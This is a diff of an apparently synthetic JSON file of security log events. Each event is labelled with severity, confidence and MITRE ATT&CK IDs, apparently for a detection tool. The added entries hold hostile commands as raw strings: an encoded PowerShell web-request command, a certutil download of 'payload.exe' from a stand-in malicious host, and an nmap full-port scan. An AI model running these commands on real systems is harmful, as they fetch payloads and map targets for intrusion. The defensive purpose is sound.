@@ -1,29 +1,29 @@
 [
   {
-    "ip": "192.168.0.10",
-    "event": "Login Failure",
-    "protocol": "SSH",
-    "raw": "Failed login from 192.168.0.10 via SSH"
+    "raw": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBS",
+    "ip": null,
+    "event": "PowerShell Execution",
+    "protocol": "PowerShell",
+    "severity": "critical",
+    "confidence": 45,
+    "mitre_id": "T1059.001"
   },
   {
-    "ip": "10.0.0.99",
-    "event": "Port Scan Detected",
-    "protocol": "TCP",
-    "raw": "Multiple scan attempts from 10.0.0.99"
-  },
-  {
-    "ip": "172.16.5.5",
-    "event": "Multiple Login Failures",
-    "protocol": "SSH",
-    "raw": "Detected multiple failed login attempts from 172.16.5.5 via SSH"
+    "raw": "nmap -sS -p 1-65535 192.168.1.1 port scan detected",
+    "ip": "192.168.1.1",
+    "event": "Port Scan",
+    "protocol": "Unknown",
+    "severity": "medium",
+    "confidence": 55,
+    "mitre_id": "T1046"
   },
   {
     "raw": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
     "ip": null,
     "event": "PowerShell Execution",
     "protocol": "PowerShell",
-    "severity": "medium",
-    "confidence": 65,
+    "severity": "critical",
+    "confidence": 75,
     "mitre_id": "T1059.001"
   },
   {
@@ -31,8 +31,44 @@
     "ip": "172.16.0.5",
     "event": "Privilege Escalation",
     "protocol": "SSH",
-    "severity": "critical",
-    "confidence": 45,
+    "severity": "high",
+    "confidence": 65,
     "mitre_id": "T1068"
+  },
+  {
+    "raw": "Failed login from 192.168.0.10 via SSH",
+    "ip": "192.168.0.10",
+    "event": "Login Failure",
+    "protocol": "SSH",
+    "severity": "high",
+    "confidence": 45,
+    "mitre_id": "T1110"
+  },
+  {
+    "raw": "User attempted privilege escalation via sudo -l",
+    "ip": null,
+    "event": "Privilege Escalation",
+    "protocol": "Unknown",
+    "severity": "medium",
+    "confidence": 35,
+    "mitre_id": "T1068"
+  },
+  {
+    "raw": "certutil -urlcache -split -f http://malicious.com/payload.exe",
+    "ip": null,
+    "event": "File Download Attempt",
+    "protocol": "HTTP",
+    "severity": "critical",
+    "confidence": 55,
+    "mitre_id": "T1105"
+  },
+  {
+    "raw": "base64 encoded payload detected in memory dump",
+    "ip": null,
+    "event": "Unknown Event",
+    "protocol": "Unknown",
+    "severity": "high",
+    "confidence": 60,
+    "mitre_id": "T1059.001"
   }
 ]
